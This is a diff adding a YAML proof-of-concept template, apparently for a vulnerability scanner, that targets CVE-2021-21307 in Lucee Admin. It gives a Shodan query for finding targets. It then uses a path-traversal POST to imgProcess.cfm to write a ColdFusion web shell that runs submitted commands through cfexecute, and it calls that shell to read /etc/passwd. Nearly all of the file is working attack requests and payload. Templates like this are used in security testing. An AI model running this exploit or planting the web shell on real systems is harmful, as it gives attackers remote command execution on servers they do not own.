@@ -1,0 +1,83 @@
+id: poc-yaml-lucee-admin-remote-code-execution
+info:
+  name: Lucee Admin 远程代码执行漏洞(CVE-2021-21307)
+  severity: critical
+  tags:
+  - rce
+  - CVE-2021-21307
+  finger: lucee
+  shodan: http.title:"Lucee"
+variables:
+  t1: random_str(27)
+requests:
+- method: POST
+  path: /lucee/admin/imgProcess.cfm?file=/whatever
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: imgSrc=a
+  expression: status_code == 200
+- method: POST
+  path: /lucee/admin/imgProcess.cfm?file=/../../../context/{{.t1}}.cfm
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'imgSrc=
+
+    <cfoutput>
+
+
+    <table>
+
+    <form method="POST" action="">
+
+    <tr><td>Command:</td><td><input type=test name="cmd" size=50
+
+    <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>
+
+    <tr><td>Options:</td><td> <input type=text name="opts" size=50
+
+    <cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>
+
+    <tr><td>Timeout:</td><td> <input type=text name="timeout" size=4
+
+    <cfif isdefined("form.timeout")>value="#form.timeout#"
+
+    <cfelse> value="5"</cfif>></td></tr>
+
+    </table>
+
+    <input type=submit value="Exec" >
+
+    </form>
+
+    <cfif isdefined("form.cmd")>
+
+    <cfsavecontent variable="myVar">
+
+    <cfexecute name = "#Form.cmd#"
+
+    arguments = "#Form.opts#"
+
+    timeout = "#Form.timeout#">
+
+    </cfexecute>
+
+    </cfsavecontent>
+
+    <pre>
+
+    #HTMLCodeFormat(myVar)#
+
+    </pre>
+
+    </cfif>
+
+    </cfoutput>'
+  expression: status_code == 200
+- method: POST
+  path: /lucee/{{.t1}}.cfm
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cmd=cat /etc/passwd&opts=&timeout=5
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(body,"Command")
+transport: http
